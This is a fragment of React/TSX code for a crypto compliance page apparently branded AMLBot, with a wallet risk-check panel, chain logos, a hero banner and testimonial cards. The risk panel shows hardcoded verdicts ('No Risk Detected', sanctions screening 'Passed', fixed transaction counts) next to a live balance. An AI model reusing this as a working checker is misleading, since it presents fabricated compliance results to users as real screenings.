        <div className="mx-auto mt-6 flex h-28 w-52 items-end justify-center overflow-hidden rounded-t-full border-[13px] border-b-0 border-emerald-400 bg-gradient-to-t from-emerald-50 to-transparent">
          <div className="mb-1 text-center">
            <p className="text-3xl font-bold text-slate-900">0%</p>
            <p className="text-[10px] font-semibold text-emerald-600">No Risk Detected</p>
          </div>
        </div>
        <p className="mt-4 text-lg font-bold text-emerald-600">Low Risk</p>
        <div className="mt-5 border-t border-slate-100 pt-4 text-left">
          <p className="text-xs font-bold text-slate-800">Address connections</p>
          <div className="mt-3 space-y-2 text-[10px] text-slate-500">
            <div className="flex justify-between"><span className="text-emerald-600">● No exposure</span><span>0%</span></div>
            <div className="flex justify-between"><span>Blacklist</span><strong className="text-emerald-600">Free</strong></div>
            <div className="flex justify-between"><span>Sanctions screening</span><strong className="text-emerald-600">Passed</strong></div>
          </div>
        </div>
      </div>
      <div className="space-y-2">
        <div className="rounded-lg border border-emerald-200 bg-emerald-50 p-3">
          <p className="text-[10px] font-bold text-emerald-700">Sanctions screening</p>
          <p className="mt-2 text-[9px] text-emerald-600">No sanctions connections found</p>
        </div>
        <div className="rounded-lg border border-slate-100 p-3">
          <p className="text-[10px] font-bold text-slate-800">Balance</p>
          <p className="mt-2 text-base font-bold text-slate-900">{balance ?? "0.000000"} {symbol ?? chain}</p>
          <p className="text-[9px] text-slate-400">Live balance from the {chain} network</p>
        </div>
        <div className="rounded-lg border border-slate-100 p-3 text-[9px] text-slate-500">
          <p className="font-bold text-slate-800">General information</p>
          <p className="mt-2">First balance change: <strong>20.09.2025</strong></p>
          <p>Number of transactions: <strong>17</strong></p>
        </div>
        <div className="rounded-lg border border-slate-100 p-3 text-[9px] text-slate-500">
          <p className="font-bold text-slate-800">Last check</p>
          <p className="mt-2">Check mode: <strong>Advanced(PRO+)</strong></p>
          <p className="mt-1">Status: <strong className="text-emerald-600">Completed</strong></p>
        </div>
      </div>
      <button
        type="button"
        onClick={downloadReport}
        className="col-span-full mt-1 rounded-md border border-primary px-4 py-2 text-xs font-semibold text-primary transition-colors hover:bg-primary hover:text-white"
      >
        Download report
      </button>
    </div>
  );
}

function CryptoLogo({ chain, size = 18 }: { chain: string; size?: number }) {
  const colors: Record<string, string> = {
    Bitcoin: "#f7931a",
    Ethereum: "#627eea",
    Solana: "#14f195",
    "BNB Chain": "#f3ba2f",
    Tron: "#eb0029",
  };

  return (
    <div
      style={{
        width: size,
        height: size,
        borderRadius: "50%",
        backgroundColor: colors[chain] || "#ccc",
        display: "flex",
        alignItems: "center",
        justifyContent: "center",
        fontSize: size * 0.6,
        color: "white",
        fontWeight: "bold",
      }}
    >
      {chain.charAt(0)}
    </div>
  );
}

function HeroGraphic() {
  return (
    <div className="relative h-64 w-full rounded-xl bg-gradient-to-br from-primary/10 to-primary/5 flex items-center justify-center">
      <div className="text-center">
        <div className="text-4xl font-bold text-primary">AMLBot</div>
        <p className="text-sm text-muted-foreground mt-2">Crypto Compliance Platform</p>
      </div>
    </div>
  );
}

function TestimonialCard({ quote, author, active, onClick }: { quote: string; author: string; active: boolean; onClick: () => void }) {
  return (
    <div
      onClick={onClick}
      className={`flex shrink-0 flex-col rounded-xl border p-6 transition-all cursor-pointer ${
        active
          ? "w-full border-primary bg-primary/5"
          : "w-80 border-slate-200 bg-white hover:border-primary/50"
      }`}
    >
      <Quote size={20} className="text-primary" />
      <p className="mt-4 flex-1 text-sm leading-relaxed text-slate-600">{quote}</p>
      <p className="mt-4 font-semibold text-slate-900">{author}</p>
    </div>
  );
}
